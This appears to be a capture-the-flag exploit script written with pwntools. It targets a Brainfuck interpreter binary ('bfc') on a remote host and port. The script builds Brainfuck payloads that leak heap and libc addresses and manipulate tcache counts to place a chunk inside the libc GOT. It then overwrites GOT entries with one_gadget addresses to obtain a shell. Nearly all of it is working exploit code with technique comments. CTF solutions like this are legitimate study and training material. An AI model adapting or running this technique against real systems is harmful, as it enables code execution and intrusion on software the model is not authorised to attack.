#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("bfc")
libc = ELF("./libc.so.6")		# libc 2.35 from ubuntu 22.04

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

host, port = "119.13.89.159", "3301"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

# move backward pointer until we send a zero, restore back content to not overwrite data (8 bytes each time)
def goback(back):
  back = back>>3
  old = p.recv(1)
  p.send('A')
  while (back>0):
    p.send(old)
    old = p.recv(1)
    if (back==1):
      p.send(b'\x00')
    else:
      p.send('A')
    back -=1


# advance pointer until we send a zero, restore back content to not overwrite data (8 bytes each time)
def goforward(amount):
  amount = amount>>3
  old = p.recv(1)
  p.send('A')
  while (amount>0):
    p.send(old)
    old = p.recv(1)
    if (amount==1):
      p.send(b'\x00')
    else:
      p.send('A')
    amount -=1

# BACK function
BACK = '<<<<<<<<.,[,<<<<<<<<.,]'
# FORWARD function
FORWARD = '>>>>>>>>.,[,>>>>>>>>.,]'

payload = '>'*0x10		# advance to allocate a bigger chunk
payload += '<'*0x30		# move ptr back to heap pointer
payload += '.>.>.>.>.>.>.>.>'	# leak heap pointer
payload += FORWARD		# advance ptr to allocate a 0x90 size chunk
payload += BACK			# move ptr back until we reach tcache_perthread_struct->counts for 0x90 chunk size
payload += '<<+++++++>>'	# set tcache chunk 0x90 size entry to 7

payload += FORWARD		# advance ptr to allocate a 0x100 (0x110 real) sized chunk, it will fre 0x90 chunk (make it goes to unsorted)
payload += BACK			# move ptr back until we reach unsorted libc address of 0x90 freed chunk
payload += '.>'*8		# leak unsorted libcaddress
payload += BACK			# move ptr back until we reach tcache_perthread_struct->counts for 0x200 (0x210 real) chunk size
payload += '<<+>>'		# increase tcache_perthread_struct->counts for 0x210 size to 1 
payload += FORWARD		# move ptr forward to next chunk address for chunk size of 0x210 chunks
payload += ',>,>,>,>,>,>,>,>'	# write target address of libc got to next chunk address for chunk size of 0x210 chunks, our target
payload += FORWARD		# advance ptr until it allocate a 0x200 (0x210 real) size chunk
payload += BACK			# go back to beginning of our new chunk in libc got
payload += ',>,>,>,>,>,>,>,>'*12	# overwrite 12 entries of libc cGOT
payload += '>'*0x1c0	# launch last malloc(0x400) that will give us code exec


sla('size of code:', str(len(payload)))
sla('code:', payload)

# get our leak
leak = u64(p.recv(8))
print('leak = '+hex(leak))
heap = (leak<<12)-0x13000
logleak('heap base', heap)
goforward(0x80)			# move forward of 0x80 bytes to allocate a 0x80 (0x90 real) tcache chunk
goback(0x13708)			# move back ptr to reach tcache_perthread_struct->counts for 0x90 chunk size, and set the counts to 7
goforward(0x13738)		# move forward until it allocate a 0x100 (0x110 real) tcache chunk,  0x90 chunk will be freed, and will go to unsorted (as counts==7)
goback(0x128)			# move back ptr to reach unsorted address in 0x90 freed chunk

# get our libc leak
libc.address = u64(p.recv(8))-0x219c00		# calculate libc base
logbase()

onegadgets = one_gadget(libc.path, libc.address)



goback(0x13670)			# move back ptr to reach tcache_perthread_struct->counts for 0x210 (0x210 real) chunk size, and set the counts to 1
goforward(0x130)		# move ptr forward to next chunk address for chunk size of 0x210 chunks
p.send(p64(libc.address+0x219040))	# write target GOT address as next 0x210 chunk address, our target

goforward(0x13700)		# move forward until it allocate a 0x200 (0x210 real) tcache chunk,  it will be allocated in libc GOT
goback(0x140)			# move backward to reach beginning of our new chunk in libc GOT

# gadget to clear rsi,rdx and jump to strlen() via libc got
target = libc.address+0x5bf67
logleak('target', target)
# overwrite 12 GOT entries, 10 first with our one gadget
# 2 last with our gadget in libc that clears rsi and rdx, and jump to strlen (libc.GOT+0x40)
p.send(p64(onegadgets[10])*10+p64(target)*2)

# now we got shell !!!
p.sendline('id;echo "bingo!!!"')

p.interactive()
